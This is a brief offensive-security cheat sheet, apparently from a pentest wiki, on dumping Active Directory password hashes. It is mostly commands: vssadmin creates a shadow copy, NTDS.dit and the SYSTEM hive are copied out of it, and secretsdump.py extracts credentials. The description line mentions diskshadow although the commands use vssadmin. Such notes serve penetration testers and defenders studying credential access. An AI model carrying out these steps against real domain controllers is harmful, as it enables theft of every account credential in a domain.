---
description: On Windows Server 2008+, we can use diskshadow to grab the ntdis.dit.
---

# vssadmin - no credential required

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/ntds.dit-enumeration" %}

```bash
CMD> vssadmin create shadow /for=C:

Shadow Copy ID: {8bf57023-7b87-4acc-beab-1902f9705267}
Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```



```bash
<CMD> Copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp
<CMD> Copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp

Kali> secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```
